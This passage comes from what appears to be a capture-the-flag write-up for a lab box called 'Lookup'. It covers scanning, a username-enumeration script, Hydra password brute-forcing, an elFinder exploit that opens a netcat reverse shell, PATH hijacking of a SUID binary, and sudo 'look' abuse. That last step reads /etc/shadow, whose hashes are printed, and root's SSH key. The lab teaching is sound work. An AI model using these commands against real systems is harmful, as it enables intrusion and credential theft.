user"},{"section":"Privilege escalation","description":"Reading root\'s id_rsa file by exploiting <i>look</i> program with GTFOBins and log in as root via SSH with id_rsa authentication"}],"body":[{"id":"Ignite","title":"<h1> <span style=\\"color:#da1953\\">Ign</span>ite</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/writeup/lookup/banner.gif\\" alt=\\"\\">"]},{"id":"Scanning","title":"<hr><h1><span style=\\"color:#da1953\\">Sca</span>nning</h1>","body":["<p>Description of found ports.</p>","<p><pre>$ nmap -sC -sV -oN nmap 10.10.14.33<br>Nmap scan report for 10.10.14.33<br>Host is up (0.032s latency).<br>Not shown: 998 closed tcp ports (conn-refused)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)<br>|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)<br>|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>|_http-title: Did not follow redirect to http://lookup.thm<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></pre></p>","<p>I have four services: port 22 SSH< and HTTP 80 with Apache 2.4.41.</p>"]},{"id":"Enumeration","title":"<h1><span style=\\"color:#da1953\\">Enum</span>eration</h1>","body":[{"id":"Setting hots","title":"<h2>Setting /etc/hosts<h2>","body":["<p>Trying to access the web page at port 80, gave me a <i>\\"The connection has timed out\\"</i> error, for some reason, my browser was not able to reach the page. By searching for this error I found out that the application was redirecting to <b>lookup.htm</b> and it was not possible to reach out until I added the host in <i>/etc/hosts<i>.</p>","<p>To do so I executed sudo vim <i>/etc/hosts</i> and added 2 new entries in the file:<br><i>10.10.114.228   files.lookup.thm<br>10.10.114.228   files.lookup.thm</i><br>now my <i>/etc/hosts</i> looks like the following.</p>","<p><pre>127.0.0.1  localhost<br>127.0.1.1  kali<br>10.10.114.228   lookup.thm<br>10.10.114.228   files.lookup.thm<br># The following lines are desirable for IPv6 capable hosts<br>::1   localhost ip6-localhost ip6-loopback<br>ff02::1 ip6-allnodes<br>ff02::2 ip6-allrouters<br></pre></p>","<p>Refreshing the page Im able to access the page.</p>"]},{"id":"Directory bruteforcing","title":"<h2>Directory bruteforcing</h2>","body":["<p>The first I did was a directory bruteforce with gobuster: <code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://lookup.thm/ -x .php,.txt,.jsp,.xml | tee gobuster</code></p>","<p>the <b>-x</b> indicate file extention to check and the command <b>tee</b> redirects the output ot a file similarly to the <b>&gt;</b> but it also prints the command output in the terminal. The pages found by Gobuster are shown below:","<p><img src=\\"/cyber/writeup/lookup/gobuster.PNG\\" alt=\\"\\"></p>"]},{"id":"User enumeration","title":"<h2>User enumeration</h2>","body":["<p>Navigating to the IP address or to <i>lookup.thm</i> I am presented with a login panel and I noticed that I am not in the <i>/login.php</i> path, hmm...</p>","<p><img src=\\"/cyber/writeup/lookup/loginurl.PNG\\" alt=\\"\\"></p>","<p>Analysing with BurpSuite</p>","<p><div class=\\"http-request\\"><span class=\\"method\\">POST</span> <span class=\\"path\\">/login.php</span> <span class=\\"version\\">HTTP/1.1</span><br><span class=\\"header-key\\">Host:</span> <span class=\\"header-value\\">lookup.thm</span><br><span class=\\"header-key\\">User-Agent:</span><span class=\\"header-value\\">Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class=\\"header-key\\">Accept:</span> <span class=\\"header-value\\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\\"header-key\\">Accept-Language:</span> <span class=\\"header-value\\">en-US,en;q=0.5</span><br><span class=\\"header-key\\">Accept-Encoding:</span> <span class=\\"header-value\\">gzip, deflate, br</span><br><span class=\\"header-key\\">Content-Type:</span><span class=\\"header-value\\">application/x-www-form-urlencoded</span><br><span class=\\"header-key\\">Content-Length:</span> <span class=\\"header-value\\">29</span><br><span class=\\"header-key\\">Origin:</span> <span class=\\"header-value\\">http://lookup.thm</span><br><span class=\\"header-key\\">Connection:</span> <span class=\\"header-value\\">keep-alive</span><br><span class=\\"header-key\\">Referer:</span> <span class=\\"header-value\\">http://lookup.thm/</span><br><span class=\\"header-key\\">Upgrade-Insecure-Requests:</span> <span class=\\"header-value\\">1</span><br><br><span class=\\"body\\"><span class=\\"post-key\\">username</span><span class=\\"equals\\">=</span><span class=\\"post-value\\">admin</span>&amp;<span class=\\"post-key\\">password</span><span class=\\"equals\\">=</span><span class=\\"post-value\\">admin</span> </span> </div> </pre></p>","<p><i>Now at this point, I have tried different enumerations to gain as much information as possible, manually or using automated enumeration tools such as Gobuster or Nikto. One of my big mistakes was to assume that if there was no mention of any users on the website it meant I didn\'t have to enumerate them. This is because, in my past challenges, there were users mentioned on the website, and usually they were the users to compromise.</i></p>","<p>I tried different combinations of usernames and passwords starting from commonly used default credentials and random usernames and passwords. I noticed that when trying the username <i>admin</i> I have a different error message. Normally by using random credentials the error message says <b>Wrong username or password. Please try again. Redirecting in 3 seconds.</b>.</p>","<p><img src=\\"/cyber/writeup/lookup/erro1.PNG\\" alt=\\"\\"></p>","<p>While using <i>admin</i> as a username, and a random password the error message changes to <b>Wrong password. Please try again. Redirecting in 3 seconds.</b>.</p>","<p><img src=\\"/cyber/writeup/lookup/erro2.PNG\\" alt=\\"\\"></p>","<p>This means I can enumerate users and check what users are registered in the system, and then given a username I can bruteforce the password, maybe? To enumerate the users I wrote the following Python scripts that test usernames from a wordlist and check the result returned by the server. Also the erro message path is at <i>/login.php</i> so the URL in the script is <i>http://lookup.thm/login.php/</i> as this is the URL used to send the credentals. The headers are simplied copied fomr Burp\'s request.</p>","<p><pre class=\\"python-code\\"><span class=\\"keyword\\">#!/usr/bin/python</span><br><span class=\\"keyword\\">from</span> concurrent.futures <span class=\\"keyword\\">import</span> ThreadPoolExecutor, as_completed<br><span class=\\"keyword\\">import</span> requests<br><span class=\\"keyword\\">import</span> sys<br><br><span class=\\"function\\">url</span> = <span class=\\"string\\">\'http://lookup.thm/login.php/\'</span><br><br><span class=\\"keyword\\">def</span> <span class=\\"function\\">userenum</span>(username):<br>   headers = {<br>       <span class=\\"string\\">\'User-Agent\'</span>: <span class=\\"string\\">\'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\'</span>,<br>       <span class=\\"string\\">\'Accept\'</span>: <span class=\\"string\\">\'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\'</span>,<br>       <span class=\\"string\\">\'Accept-Language\'</span>: <span class=\\"string\\">\'en-US,en;q=0.5\'</span>,<br>       <span class=\\"string\\">\'Accept-Encoding\'</span>: <span class=\\"string\\">\'gzip, deflate, br\'</span>,<br>       <span class=\\"string\\">\'Content-Type\'</span>: <span class=\\"string\\">\'application/x-www-form-urlencoded\'</span>,<br>       <span class=\\"string\\">\'Content-Length\'</span>: <span class=\\"string\\">\'33\'</span>,<br>       <span class=\\"string\\">\'Origin\'</span>: <span class=\\"string\\">\'http://lookup.thm\'</span>,<br>       <span class=\\"string\\">\'Connection\'</span>: <span class=\\"string\\">\'keep-alive\'</span>,<br>       <span class=\\"string\\">\'Referer\'</span>: <span class=\\"string\\">\'http://lookup.thm/\'</span>,<br>       <span class=\\"string\\">\'Upgrade-Insecure-Requests\'</span>: <span class=\\"string\\">\'1\'</span><br>   }<br>   <br>   myobj = {<span class=\\"string\\">\'username\'</span>: username, <span class=\\"string\\">\'password\'</span>: <span class=\\"string\\">\'testpass\'</span>}<br>   x = requests.post(url, data=myobj, headers=headers)<br>   <span class=\\"keyword\\">if</span> <span class=\\"string\\">\\"Wrong username\\"</span> <span class=\\"keyword\\">not in</span> x.text:<br>       print(username)<br>       exit()<br><br>f = open(sys.argv[1], <span class=\\"string\\">\'r\'</span>)<br>usernames = f.read().splitlines()<br>num_threads = 10<br><br><span class=\\"keyword\\">def</span> <span class=\\"function\\">test_usernames_in_batches</span>(usernames, num_threads):<br>   <span class=\\"keyword\\">with</span> ThreadPoolExecutor(max_workers=num_threads) <span class=\\"keyword\\">as</span> executor:<br>       <span class=\\"comment\\"># Submit all tasks in chunks to avoid memory overload</span><br>       <span class=\\"keyword\\">for</span> i <span class=\\"keyword\\">in</span> range(0, len(usernames), num_threads):<br>           batch = usernames[i:i + num_threads]<br>           futures = {executor.submit(userenum, username): username <span class=\\"keyword\\">for</span> username <span class=\\"keyword\\">in</span> batch}<br><br>           <span class=\\"comment\\"># Process results as they complete</span><br>           <span class=\\"keyword\\">for</span> future <span class=\\"keyword\\">in</span> as_completed(futures):<br>               username = futures[future]<br>               <span class=\\"keyword\\">try</span>:<br>                   future.result()  <span class=\\"comment\\"># To raise any exceptions if they occurred</span><br>               <span class=\\"keyword\\">except</span> Exception <span class=\\"keyword\\">as</span> e:<br>                   print(<span class=\\"string\\">f\\"Error processing {username}: {e}\\"</span>)<br><br>test_usernames_in_batches(usernames, num_threads)<br></pre></p>","<p>For this code, I took help from ChatGPT because the first version was single-threaded and it was very slow, I didn\'t how to create more threads. <span style=\\"color:#FFC107\\">Note that ChatGPT or similar AIs are banned during OSCP and may be the same for other certifications as well. During this box, I didn\'t know that.</span></p>","<p>After quite a bit my script found a username, <b>jose</b>. Now I can proceed to brute force Jose\'s password with Hydra using <i>rockyou.txt</i> wordlist.</p>","<p><img src=\\"/cyber/writeup/lookup/jose.PNG\\" alt=\\"\\"></p>"]}]},{"id":"Bruteforcing password","title":"<h1><span style=\\"color:#da1953\\">Bru</span>teforcing password</h1>","body":["<p>The command I executed is:<br><code>$ hydra -l jose -P /usr/share/wordlists/rockyou.txt -f -V lookup.thm http-post-form \\"/login.php:username=^USER^&password=^PASS^:Wrong\\" -V</code>","<p><pre>$ hydra -l jose -P /usr/share/wordlists/rockyou.txt -f -V lookup.thm http-post-form \\"/login.php:username=^USER^&password=^PASS^:Wrong\\" -V<br>Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-29 20:44:18<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task<br>[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:Wrong<br>[ATTEMPT] target lookup.thm - login \\"jose\\" - pass \\"123456\\" - 1 of 14344399 [child 0] (0/0)<br>[ATTEMPT] target lookup.thm - login \\"jose\\" - pass \\"12345\\" - 2 of 14344399 [child 1] (0/0)<br>[ATTEMPT] target lookup.thm - login \\"jose\\" - pass \\"123456789\\" - 3 of 14344399 [child 2] (0/0)<br>[ATTEMPT] target lookup.thm - login \\"jose\\" - pass \\"password\\" - 4 of 14344399 [child 3] (0/0)<br>[ATTEMPT] target lookup.thm - login \\"jose\\" - pass \\"iloveyou\\" - 5 of 14344399 [child 4] (0/0)<br>[ATTEMPT] target lookup.thm - login \\"jose\\" - pass \\"princess\\" - 6 of 14344399 [child 5] (0/0)<br>[ATTEMPT] target lookup.thm - login \\"jose\\" - pass \\"1234567\\" - 7 of 14344399 [child 6] (0/0)<br>[ATTEMPT] target lookup.thm - login \\"jose\\" - pass \\"rockyou\\" - 8 of 14344399 [child 7] (0/0)<br><br>[...SNIPPED...]<br><br>[ATTEMPT] target lookup.thm - login \\"jose\\" - pass \\"sniper\\" - 1413 of 14344399 [child 14] (0/0)<br>[ATTEMPT] target lookup.thm - login \\"jose\\" - pass \\"erica\\" - 1414 of 14344399 [child 6] (0/0)<br>[<b>80</b>][<b>http-post-form</b>] host: <b>lookup.thm</b>   login: <b>jose</b>   password: <b>password123</b><br>[STATUS] attack finished for lookup.thm (valid pair found)<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-29 20:41:28<br></pre></p>","<p>Now let\'s try to attemp a login with this credentials <b>jose</b>:<b>passowrd123</b>.</p>"]},{"id":"Shell as www-data","title":"<h1><span style=\\"color:#da1953\\">She</span>ll as www-data</h1>","body":["<p>Once successfully logged in I am inside an application called Elffinder.</p>","<blockquote>elFinder is an open-source file manager for web, written in JavaScript using jQuery UI. Creation is inspired by simplicity and convenience of Finder program used in Mac OS X operating system.</blockquote>","<p><img src=\\"/cyber/writeup/lookup/elfinder.PNG\\" alt=\\"\\"></p>","<p>I inspected different files I was able to access and found different information such as names, but nothing interesting they seemed not useful in this situation</p>","<p><img src=\\"/cyber/writeup/lookup/usertxt.PNG\\" alt=\\"\\"></p>","<p>The second thing was to check the version of the application by clicking on the <b>?</b> question mark icon.</p>","<p><img src=\\"/cyber/writeup/lookup/elfinderinfoicon.PNG\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/writeup/lookup/elfinderversion.PNG\\" alt=\\"\\"></p>","<p>A quick search on Google shows that the version is vulnerable. I tried many of the available exploits but ended up being able to successfully get a shell with this one from <a href=\\"https://github.com/hadrian3689/elFinder_2.1.47_php_connector_rce/blob/main/exploit.py\\">GitHub</a></p>","<p><img src=\\"/cyber/writeup/lookup/exploitsearch.png\\" alt=\\"\\"></p>","<p>I set my listener with NetCat as <code>nc -lvnp 4444</code> and run the exploit as <code>python3 ./exploit.py.1 -t http://files.lookup.thm/elFinder/ -lh 10.21.112.161 -lp 4444</code>.</p>","<p><img src=\\"/cyber/writeup/lookup/runexploit.PNG\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/writeup/lookup/revshell.PNG\\" alt=\\"\\"></p>","<p>As a user <i>www-data</i> I am not able to access the user flag, I must become user <i>think</i>.</p>","<p><pre>www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ cd /home<br>cd /home<br>www-data@lookup:/home$ ls<br>ls<br>think<br>www-data@lookup:/home$ cd /think<br>cd /think<br>bash: cd: /think: No such file or directory<br>www-data@lookup:/home$ ls think  <br>ls think<br>user.txt<br>www-data@lookup:/home$ cat ./think/user.txt<br>cat ./think/user.txt<br>cat: ./think/user.txt: Permission denied<br></pre></p>"]},{"id":"Shell as Think","title":"<h1><span style=\\"color:#da1953\\">She</span>ll as Think</h1>","body":["<p>Now that I have the shell it is time to privilege escalation.The first thing I check once I have a shell is the command the current user can run as sudo, and for that, I use <code>sudo -l</code>. In this case, it is giving me an error which I honestly don\'t know what is it.</p>","<p><img src=\\"/cyber/writeup/lookup/sudoerror.PNG\\" alt=\\"\\"></p>","<p>The next step is to check what users are available in the system as the <i>www-data</i> user al always limited in actions. Maybe other real users are less limited and are able to run more commands, and hopefully with sudo privileges. To check the available users in the system I run the following command <code>cat /etc/passwd | grep /bin/bash</code></p>","<p><img src=\\"/cyber/writeup/lookup/systemusers.PNG\\" alt=\\"\\"></p>","<p>There are only 2 users in the system, root and <i>think</i>.<p>",{"id":"SUID program to exploit","title":"<h2>SUID program to exploit</h2>","body":["<p>Now I have to do lateral movement and compromise <i>think</i> and access as <i>think</i> user. Continuing my enumeration the next step is what program I can run with SUID. At this point, I do not know what will lead me in the right direction I am just following a <a href=\\"https://github.com/intotheewild/OSCP-Checklist/blob/main/03a.%20Linux%20Privilege%20Escalation.md\\">Linux Privilege Escalation</a> checklist found on Google used for the OSCP exam, kind of blindly.</p>","<p><pre>www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ find / -perm -u=s -type f 2>/dev/null<br>&lt;elFinder/php$ find / -perm -u=s -type f 2>/dev/null<br>/snap/snapd/19457/usr/lib/snapd/snap-confine<br>/snap/core20/1950/usr/bin/chfn<br>/snap/core20/1950/usr/bin/chsh<br>/snap/core20/1950/usr/bin/gpasswd<br>/snap/core20/1950/usr/bin/mount<br>/snap/core20/1950/usr/bin/newgrp<br>/snap/core20/1950/usr/bin/passwd<br>/snap/core20/1950/usr/bin/su<br>/snap/core20/1950/usr/bin/sudo<br>/snap/core20/1950/usr/bin/umount<br>/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/snap/core20/1950/usr/lib/openssh/ssh-keysign<br>/snap/core20/1974/usr/bin/chfn<br>/snap/core20/1974/usr/bin/chsh<br>/snap/core20/1974/usr/bin/gpasswd<br>/snap/core20/1974/usr/bin/mount<br>/snap/core20/1974/usr/bin/newgrp<br>/snap/core20/1974/usr/bin/passwd<br>/snap/core20/1974/usr/bin/su<br>/snap/core20/1974/usr/bin/sudo<br>/snap/core20/1974/usr/bin/umount<br>/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/snap/core20/1974/usr/lib/openssh/ssh-keysign<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/sbin/pwm<br>/usr/bin/at<br>/usr/bin/fusermount<br>/usr/bin/gpasswd<br>/usr/bin/chfn<br>/usr/bin/sudo<br>/usr/bin/chsh<br>/usr/bin/passwd<br>/usr/bin/mount<br>/usr/bin/su<br>/usr/bin/newgrp<br>/usr/bin/pkexec<br>/usr/bin/umount<br></pre></p>","<p>What caught my eye was the program <b>/usr/sbin/pwm</b>, it is an uncommon program that never found in my previous challenges, but it is worth looking into by runnig it.</p>","<p><pre>www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ /usr/sbin/pwm<br>&lt;.lookup.thm/public_html/elFinder/php$ /usr/sbin/pwm<br>[!] Running \'id\' command to extract the username and user ID (UID)<br>[!] ID: www-data<br>[-] File /home/www-data/.passwords not found</pre></p>","<p>Very interesting! It runs the command <b>Id</b> that outputs something like this <i>uid=33(www-data) gid=33(www-data) groups=33(www-data)</i> to find the username and try to access the home directory by crafting the path with the name extracted from the command <b>Id<b>.</p>","<p>Giving a quick look at the home directory I can see that www-data has no home folder so the program <b>/usr/sbin/pwm</b> can\'t access such a folder. But the think do have a home folder. Only if I could provide the <i>think</i> user\'s <b>Id</b> instead of <i>www-data</i>...</p>","<p><img src=\\"/cyber/writeup/lookup/meme.jpg\\" alt=\\"\\"></p>"]},{"id":"Hijackin program execution","title":"<h2>Hijackin program execution</h2>","body":["<p>To go further I have to understand how Linux programs are executed from the terminal. The question to ask is: how does the terminal know where the program is when I write the name in the terminal like id, pwd, ls etc.? It uses a variable called PATH that lists a series of folder to check if they contains any program with the spcified name.</p>","<p><pre>www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ echo $PATH<br>&lt;les.lookup.thm/public_html/elFinder/php$ echo $PATH                <br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br></pre></p>","<p>in this case the search paths are <i>/usr/local/sbin</i>, <i>/usr/local/bin</i>, <i>/usr/sbin</i>, <i>/usr/bin</i>, <i>/sbin</i>, <i>/bin</i>, and the first match will be executed as it check these folder in order. Each user has their own list of paths stored in the PATH variable. This means different users can have different paths where the system looks for programs. If a new path is added at the beginning of the list, the system will check that path first before looking at others. If it finds the program there, it won’t check the rest of the paths. This can be used to trick the system. For example, if someone adds a fake version of a command (like id) in a path that comes first, the system will run that fake command instead of the real one. The path I am going to use is <i>/tmp</i> as it is unresticted and I have read and write permission.</p>","<p><pre>www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ export PATH=/tmp:$PATH<br>&lt;hm/public_html/elFinder/php$ export PATH=/tmp:$PATH                <br>www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ echo $PATH<br>&lt;les.lookup.thm/public_html/elFinder/php$ echo $PATH                <br>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br></pre></p>","<p>Now that <i>/tmp</i> is at the beginning of the <b>PATH</b>, if a program named <b>id</b> exists there, it will run instead of the real one. The idea is to create a new id program that gives as output the id of the user think instead of <i>www-data</i>. So first of all I need to know what the output of the real id of the user think is.</p>","<p><pre>www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ cd /tmp<br>cd /tmp<br>www-data@lookup:/tmp$ id think<br>id think<br>uid=1000(think) gid=1000(think) groups=1000(think)<br></pre></p>","<p>Now that we know the output of the <b>id</b> command of think user I can craft the simple bash program to give the exact same output.</p>","<p><pre>echo -e \'#!/usr/bin/bash\\\\necho \\"uid=1000(think) gid=1000(think) groups=1000(think)\\"\' > id</pre></p>","<p>Now by running the program <b>/usr/sbin/pwm</b> I have a whole different output and it looks like a password wordlist.</p>","<p><pre>www-data@lookup:/tmp$ /usr/sbin/pwm<br>/usr/sbin/pwm<br>[!] Running \'id\' command to extract the username and user ID (UID)<br>[!] ID: think<br>jose1006<br>jose1004<br>jose1002<br>jose1001teles<br>jose100190<br>jose10001<br>jose10.asd<br>jose10+<br>jose0_07<br>jose0990<br>jose0986$<br>jose098130443<br>jose0981<br>jose0924<br>jose0923<br>jose0921<br>thepassword<br>jose(1993)<br>jose\'sbabygurl<br>jose&vane<br>jose&takie<br>jose&samantha<br>jose&pam<br>jose&jlo<br>jose&jessica<br>jose&jessi<br>josemario.AKA(think)<br>jose.medina.<br>jose.mar<br>jose.luis.24.oct<br>jose.line<br>jose.leonardo100<br>jose.leas.30<br>jose.ivan<br>jose.i22<br>jose.hm<br>jose.hater<br>jose.fa<br>jose.f<br>jose.dont<br>jose.d<br>jose.com}<br>jose.com<br>jose.chepe_06<br>jose.a91<br>jose.a<br>jose.96.<br>jose.9298<br>jose.2856171<br></pre></p>"]},{"id":"Bruteforcing SSH password","title":"<h2>Bruteforcing SSH password</h2>","body":["Now the only other application that is left to compromise is the SSH. So I will try brute-forcing the think user\'s password with the wordlist found. But first I will save this list in a file on my local computer just by copy-pasting it from the terminal.","<p>Now the only other application that is left to compromise is the SSH. So I will try brute-forcing the think user\'s password with the wordlist found. But first I will save this list in a file on my local computer just by copy-pasting it from the terminal and naming the file \\"thinkoutput\\". <code>hydra -l think -P ./thinkoutput 10.10.99.62 ssh -t 20</code></p>","<p><pre>$ hydra -l think -P ./thinkoutput 10.10.99.62 ssh -t 20<br>Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-30 09:14:51<br>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 20 tasks per 1 server, overall 20 tasks, 50 login tries (l:1/p:50), ~3 tries per task<br>[DATA] attacking ssh://10.10.99.62:22/<br>[<b>22</b>][<b>ssh</b>] host: <b>10.10.99.62</b>   login: <b>think</b>   password: <b>josemario.AKA(think)</b><br>1 of 1 target successfully completed, 1 valid password found<br>[WARNING] Writing restore file because 3 final worker threads did not complete until end.<br>[ERROR] 3 targets did not resolve or could not be connected<br>[ERROR] 0 target did not complete<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-30 09:14:58<br></pre></p>","<p>I can now log in as user think via SSH. <code>ssh think@10.10.99.62</code></p>","<p><pre>$ ssh think@10.10.99.62<br>The authenticity of host \'10.10.99.62 (10.10.99.62)\' can\'t be established.<br>ED25519 key fingerprint is SHA256:Ndgax/DOZA6JS00F3afY6VbwjVhV2fg5OAMP9TqPAOs.<br>This host key is known by the following other names/addresses:<br>    ~/.ssh/known_hosts:6: [hashed name]<br>    ~/.ssh/known_hosts:7: [hashed name]<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added \'10.10.99.62\' (ED25519) to the list of known hosts.<br>think@10.10.99.62\'s password: <br>Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>  System information as of Thu 30 Jan 2025 02:19:12 PM UTC<br><br>  System load:  0.0               Processes:             131<br>  Usage of /:   59.7% of 9.75GB   Users logged in:       0<br>  Memory usage: 23%               IPv4 address for ens5: 10.10.99.62<br>  Swap usage:   0%<br><br><br>Expanded Security Maintenance for Applications is not enabled.<br><br>7 updates can be applied immediately.<br>To see these additional updates run: apt list --upgradable<br><br>Enable ESM Apps to receive additional future security updates.<br>See https://ubuntu.com/esm or run: sudo pro status<br><br><br>The list of available updates is more than a week old.<br>To check for new updates run: sudo apt update<br>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings<br><br><br>Last login: Sun May 12 12:07:25 2024 from 192.168.14.1<br><b>think@lookup</b>:~$ <br></pre></p>","<p>As user <i>think</i> I am able to retrieve the user flag.</p>","<p><pre><b>think@lookup</b>:~$ ls<br>user.txt<br><b>think@lookup</b>:~$ cat user.txt <br>38375fb4dd8baa2b2039ac03d92b820e<br></pre></p>"]}]},{"id":"Privilege escalation","title":"<h1><span style=\\"color:#da1953\\">Pri</span>vilege escalation</h1>","body":["<p>The first enumeration I always perform as mentioned earlier is to check what command the user can run as sudo, I do that by running <code>sudo -l</code>.</p>","<p><pre><b>think@lookup</b>:~$ sudo -l<br>[sudo] password for think:<br>Matching Defaults entries for think on lookup:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\:/sbin\\\\:/bin\\\\:/snap/bin<br><br>User think may run the following commands on lookup:<br>    (ALL) /usr/bin/look<br></pre></p>","<p>The user think can run the command <b>look</b> in <b>/usr/bin/look</b> with sudo privilege. At the time of doing this box, I never encountered this program. My only hope is that <a href=\\"https://gtfobins.github.io/\\">GTFOBins</a> has the commands to exploit it. Luckily it has the <a href=\\"https://gtfobins.github.io/gtfobins/look/\\">exploit</a> for the command look and I can read arbitrary files. Follwing the commands to execute to read arbitrary files.</p>","<p><pre>LFILE=file_to_read<br>sudo look \'\' \\"$LFILE\\"</pre></p>","<p>The first thing I tried to read was the file <i>/etc/shadow</i> and attempted to crack the password.</p>","<p><pre><b>think@lookup</b>:~$ LFILE=/etc/shadow<br><b>think@lookup</b>:~$ sudo look \'\' \\"$LFILE\\"<br>root:$6$2Let6rRsGjyY5Nym$Z9P/fbmQG/EnCtlx9U5l78.bQYu8ZRwG9rgKqurGHHLpMWIXd01lUsj42ifJHHkBlwodtvi1C2Vor8Hwbu6sU1:19855:0:99999:7:::<br>daemon:*:19046:0:99999:7:::<br>bin:*:19046:0:99999:7:::<br>sys:*:19046:0:99999:7:::<br>sync:*:19046:0:99999:7:::<br>games:*:19046:0:99999:7:::<br>man:*:19046:0:99999:7:::<br>lp:*:19046:0:99999:7:::<br>mail:*:19046:0:99999:7:::<br>news:*:19046:0:99999:7:::<br>uucp:*:19046:0:99999:7:::<br>proxy:*:19046:0:99999:7:::<br>www-data:*:19046:0:99999:7:::<br>backup:*:19046:0:99999:7:::<br>list:*:19046:0:99999:7:::<br>irc:*:19046:0:99999:7:::<br>gnats:*:19046:0:99999:7:::<br>nobody:*:19046:0:99999:7:::<br>systemd-network:*:19046:0:99999:7:::<br>systemd-resolve:*:19046:0:99999:7:::<br>systemd-timesync:*:19046:0:99999:7:::<br>messagebus:*:19046:0:99999:7:::<br>syslog:*:19046:0:99999:7:::<br>_apt:*:19046:0:99999:7:::<br>tss:*:19046:0:99999:7:::<br>uuidd:*:19046:0:99999:7:::<br>tcpdump:*:19046:0:99999:7:::<br>landscape:*:19046:0:99999:7:::<br>pollinate:*:19046:0:99999:7:::<br>usbmux:*:19510:0:99999:7:::<br>sshd:*:19510:0:99999:7:::<br>systemd-coredump:!!:19510::::::<br>lxd:!:19510::::::<br>think:$6$Cqt14LKfnwO1hA/a$c/g4M9yiP1KGJtbiOS4zubpw2.sm4bPfCglqddPpUS615xwwsU4eg1q.nr6UDLppea8AlmJ5fQUUewLICNU371:19568:0:99999:7:::<br>fwupd-refresh:*:19510:0:99999:7:::<br>mysql:!:19568:0:99999:7:::<br></pre></p>","First step is to save the hash in a file that I named \\"hash\\", <br><code>echo \\"root:$6$2Let6rRsGjyY5Nym$Z9P/fbmQG/EnCtlx9U5l78.bQYu8ZRwG9rgKqurGHHLpMWIXd01lUsj42ifJHHkBlwodtvi1C2Vor8Hwbu6sU1:19855:0:99999:7:::\\" > hash</code>.","<p><pre>$ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash<br>Using default input encoding: UTF-8<br>Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])<br>Cost 1 (iteration count) is 5000 for all loaded hashes<br>Will run 2 OpenMP threads<br>Press \'q\' or Ctrl-C to abort, almost any other key for status<br></pre></p>","<p>I left running JohnTheRipper (JTR) for a very long time, it was not finished yet and it did not find the password. Usually, it\'s an indication that this is not the right way. Why can I say this? The box submission guidelines specify that every password that is meant to be cracked must finish around 5 minutes of the tool running. This is a uideline that HTB and THM follows.</p>","<p>Now after spending a little time, I figured out that I can try to read the SSH id_rsa file to log as <i>root</i> without the need for a password. Let\'s try this! The path where the <i>id_rsa</i> is usually stored is <i>[userhome]/.ssh/id_rsa</i> in this case the home is <i>/root</i> so the full path would be <i>/root/.ssh/id_rsa</i> if it exists.</p>","<p><pre><b>think@lookup</b>:~$ LFILE=/root/.ssh/id_rsa<br><b>think@lookup</b>:~$ sudo look \'\' \\"$LFILE\\"<br>[sudo] password for think: <br>-----BEGIN OPENSSH 